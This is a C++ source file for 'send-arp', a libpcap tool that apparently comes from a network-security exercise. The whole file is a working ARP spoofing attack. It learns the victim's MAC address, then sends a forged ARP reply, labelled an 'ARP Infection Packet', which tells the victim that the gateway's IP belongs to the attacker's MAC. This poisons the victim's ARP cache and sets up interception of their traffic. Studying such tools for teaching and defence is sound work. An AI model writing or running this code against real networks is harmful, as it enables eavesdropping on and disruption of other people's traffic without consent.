#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getmac.h"
#include "getip.h"


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.35.49 192.168.35.1\n");
}

int main(int argc, char* argv[]) {

    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return -1;
    }

    //1. Get my IP, MAC Address
    uint32_t ip_addr = 0;
    Ip My_IP_Addr = GetIpAddress(dev, ip_addr);

    uint8_t mac_addr[6];
    GetMacAddress(dev, mac_addr);
    Mac My_Mac_Addr = mac_addr;


    //2. Send ARP Request Packet to Sender(Victim)
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(Mac::broadcastMac());
    packet.eth_.smac_ = My_Mac_Addr;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = My_Mac_Addr;
    packet.arp_.sip_ = htonl(My_IP_Addr);
    packet.arp_.tmac_ = Mac(Mac::nullMac());
    packet.arp_.tip_ = htonl(Ip(argv[2]));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    //3. Get Sender(Victim) MAC_address
    const u_char* arp_packet;
    struct pcap_pkthdr* arp_header;
    struct EthHdr* Ethernet;
    struct ArpHdr* Arp;
    struct Mac Sender_Mac_Addr;
    EthArpPacket Sender_Reply;

    while(true) {
        int res = pcap_next_ex(handle, &arp_header, &arp_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        Ethernet = (struct EthHdr *)(arp_packet);
        Arp = (struct ArpHdr *)(arp_packet + sizeof(EthHdr));
        if (ntohs(Ethernet->type_) == EthHdr::Arp && ntohs(Arp->op_) == ArpHdr::Reply && ntohl(Arp->sip_) == Ip(argv[2])){
            Sender_Mac_Addr = Arp->smac_;
            break;
        }
    }


    //4. Send ARP Infection Packet to Sender(Victim)
    packet.eth_.dmac_ = Sender_Mac_Addr;
    packet.eth_.smac_ = My_Mac_Addr;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = My_Mac_Addr;
    packet.arp_.sip_ = htonl(Ip(argv[3]));
    packet.arp_.tmac_ = Sender_Mac_Addr;
    packet.arp_.tip_ = htonl(Ip(argv[2]));

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

